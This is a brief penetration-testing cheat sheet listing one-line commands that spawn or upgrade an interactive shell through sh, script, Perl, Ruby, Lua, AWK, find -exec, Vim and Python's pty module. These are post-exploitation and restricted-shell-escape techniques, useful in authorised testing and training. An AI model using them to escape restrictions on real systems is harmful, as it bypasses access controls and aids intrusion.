# Spawning Shells
```table-of-contents
```
## /bin/sh -i
```shell
/bin/sh -i
```
## Script
```shell
script /dev/null -c bash
```
## Perl
```shell
perl -e 'exec "/bin/sh";'
# OR
perl: exec "/bin/sh";
```
## Ruby
```shell
ruby: exec "/bin/sh"
```
## Lua
```shell
lua: os.execute('/bin/sh')
```
## AWK
```shell
awk 'BEGIN {system("/bin/sh")}'
```
## Find / Exec
```shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
# OR
find . -exec /bin/sh \; -quit
```
## Vim
```shell
vim -c ':!/bin/sh'
# OR inside Vim:
:set shell=/bin/sh
:shell
```
## Upgrading Shells (TTY)
### Python (The Standard)
```shell
python -c 'import pty; pty.spawn("/bin/bash")'
# OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
```